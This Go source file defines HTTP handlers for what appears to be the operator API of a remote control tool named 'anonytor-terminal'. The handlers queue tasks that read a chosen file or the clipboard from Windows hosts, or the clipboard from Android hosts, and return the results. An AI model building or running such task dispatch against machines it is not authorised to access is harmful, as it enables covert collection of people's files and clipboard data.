package handlers

import (
	"net/http"

	"github.com/gin-gonic/gin"

	"anonytor-terminal/api/middlewares"
	"anonytor-terminal/controller/task"
	"anonytor-terminal/controller/task/android"
	"anonytor-terminal/controller/task/windows"
	"anonytor-terminal/runtime/definition"
)

func RegisterTask(r *gin.RouterGroup) {
	r.POST("", CreateTask())
	r.GET("", GetTaskDetail())
}

func CreateTask() gin.HandlerFunc {
	return func(c *gin.Context) {
		type req struct {
			OS      int                    `json:"os"`
			ID      string                 `json:"id"`
			CmdType definition.CmdType     `json:"cmdType"`
			Param  string `json:"param"`
		}
		var r req
		err := c.ShouldBindJSON(&r)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"status": definition.StatusBadRequest,
			})
			return
		}
		var t task.Interface
		ctrl := middlewares.GetController(c)
		if r.OS == definition.Windows {
			switch r.CmdType {
			case definition.GetFileContent:
				t = &windows.GetFileContentTask{Path: r.Param}
				err := ctrl.ExecuteTask(r.ID, t)
				if err != nil {
					panic(err)
				}
			case definition.GetClipboard:
				t = &windows.GetClipboardTask{}
				err := ctrl.ExecuteTask(r.ID, t)
				if err != nil {
					panic(err)
				}
			}
		} else if r.OS == definition.Android {
			switch r.CmdType {
			case definition.GetClipboard:
				t = &android.GetClipboardTask{}
				err := ctrl.ExecuteTask(r.ID, t)
				if err != nil {
					panic(err)
				}
			}
		}
		if t == nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"status": definition.StatusBadRequest,
			})
			return
		}
		c.JSON(http.StatusOK, gin.H{
			"status": definition.StatusOK,
			"id": t.GetId(),
		})
	}
}

func GetTaskDetail() gin.HandlerFunc {
	return func(c *gin.Context) {
		hostId := c.Query("host_id")
		taskId := c.Query("task_id")
		ctrl := middlewares.GetController(c)
		t := ctrl.GetTask(hostId, taskId)
		if t == nil {
			c.JSON(http.StatusNotFound, gin.H{
				"status": definition.StatusNotFound,
			})
			return
		}
		c.JSON(http.StatusOK, gin.H{
			"status": definition.StatusOK,
			"task_status": t.GetStatus(),
			"result": t.GetResult(),
		})
	}
}
